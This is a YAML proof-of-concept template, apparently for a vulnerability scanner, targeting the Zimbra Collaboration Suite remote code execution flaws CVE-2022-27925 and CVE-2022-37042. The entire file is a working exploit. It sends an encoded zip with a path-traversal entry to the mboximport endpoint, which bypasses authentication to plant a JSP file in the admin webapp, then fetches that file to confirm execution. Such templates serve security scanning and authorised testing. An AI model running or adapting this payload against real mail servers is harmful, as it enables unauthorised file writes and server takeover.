name: poc-yaml-zimbra-cve-2022-27925-cve-2022-37042-rce
binding: 8d8014a5-6433-449c-b5d9-77a6d75c07d1
manual: true
detail:
    author: Xz
    links:
        - https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/
        - https://blog.zimbra.com/2022/08/authentication-bypass-in-mailboximportservlet-vulnerability/
        - https://github.com/vnhacker1337/CVE-2022-27925-PoC
        - https://nvd.nist.gov/vuln/detail/CVE-2022-37042
    vulnerability:
        id: CT-421144
        level: high
    description: Zimbra Collaboration Suite 8.8.15/9.0 - Remote Code Execution
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    data: base64Decode("UEsDBBQAAAAIAFifUFWuXdJDeAAAAIQAAAA3AAAALi4vLi4vLi4vLi4vbWFpbGJveGQvd2ViYXBwcy96aW1icmFBZG1pbi8wMTIzNDU2Nzg5LmpzcB3MsQ7CIBRG4b1PYZo0gYWUCk0ajaOz0Se4lD+KIYB4W1/f6ni+4Ry7Ji+sSg2JYxKt1SMsnJlHB2v3NDpPwzQNRpte9x6tPDQJn92TVlIhq3OIEFRKDDNxyEndwVdQvBA/RMVrwZt/dkNdI/jPUkrlsRXEdutOXw==")
    filename: randomLowercase(10)
    file: replaceAll(data, "0123456789", filename)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1
            headers:
                Accept-Encoding: gzip, deflate
                Content-Type: application/x-www-form-urlencoded
            body: |
                {{file}}
        expression: response.status == 401
    r1:
        request:
            cache: true
            method: POST
            path: /zimbraAdmin/{{filename}}.jsp
            headers:
                Accept-Encoding: gzip, deflate
                Content-Type: application/x-www-form-urlencoded
        expression: response.status == 200 && response.body.bcontains(b"516e5eb4c6be553a6bda2992414010de")
expression: r0() && r1()
